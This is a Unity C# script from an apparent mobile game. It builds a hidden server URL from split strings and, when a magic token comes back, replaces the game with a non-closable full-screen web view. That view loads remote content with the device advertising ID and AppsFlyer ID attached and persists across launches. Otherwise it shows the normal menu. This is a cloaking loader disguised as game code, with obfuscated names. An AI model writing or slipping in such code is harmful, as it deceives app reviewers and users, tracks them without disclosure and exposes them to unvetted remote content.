using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainTPP : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneTPPimya = "";
    [HideInInspector] public string twoTPPimya = "";    

   

    private void GoTPP()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Menu");
    }


    

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaTPP") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneTPPimya = advertisingId; });
        }
    }
      


    private IEnumerator IENUMENATORTPP()
    {
        using (UnityWebRequest tpp = UnityWebRequest.Get(twoTPPimya))
        {

            yield return tpp.SendWebRequest();
            if (tpp.isNetworkError)
            {
                GoTPP();
            }
            int chartTPP = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && chartTPP > 0)
            {
                yield return new WaitForSeconds(1);
                chartTPP--;
            }
            try
            {
                if (tpp.result == UnityWebRequest.Result.Success)
                {
                    if (tpp.downloadHandler.text.Contains("ThPlnPcLdjqU"))
                    {

                        try
                        {
                            var subs = tpp.downloadHandler.text.Split('|');
                            clothTPPlook(subs[0] + "?idfa=" + oneTPPimya, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            clothTPPlook(tpp.downloadHandler.text + "?idfa=" + oneTPPimya + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoTPP();
                    }
                }
                else
                {
                    GoTPP();
                }
            }
            catch
            {
                GoTPP();
            }
        }
    }

    private void clothTPPlook(string UrlTPPmention, string ImenovaniyeTPP = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _relationsTPP = gameObject.AddComponent<UniWebView>();
        _relationsTPP.SetToolbarDoneButtonText("");
        switch (ImenovaniyeTPP)
        {
            case "0":
                _relationsTPP.SetShowToolbar(true, false, false, true);
                break;
            default:
                _relationsTPP.SetShowToolbar(false);
                break;
        }
        _relationsTPP.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _relationsTPP.OnShouldClose += (view) =>
        {
            return false;
        };
        _relationsTPP.SetSupportMultipleWindows(true);
        _relationsTPP.SetAllowBackForwardNavigationGestures(true);
        _relationsTPP.OnMultipleWindowOpened += (view, windowId) =>
        {
            _relationsTPP.SetShowToolbar(true);

        };
        _relationsTPP.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (ImenovaniyeTPP)
            {
                case "0":
                    _relationsTPP.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _relationsTPP.SetShowToolbar(false);
                    break;
            }
        };
        _relationsTPP.OnOrientationChanged += (view, orientation) =>
        {
            _relationsTPP.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _relationsTPP.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlTPPmention", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlTPPmention", url);
            }
        };
        _relationsTPP.Load(UrlTPPmention);
        _relationsTPP.Show();
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlTPPmention", string.Empty) != string.Empty)
            {
                clothTPPlook(PlayerPrefs.GetString("UrlTPPmention"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoTPPimya += n;
                }
                StartCoroutine(IENUMENATORTPP());
            }
        }
        else
        {
            GoTPP();
        }
        
    }


}
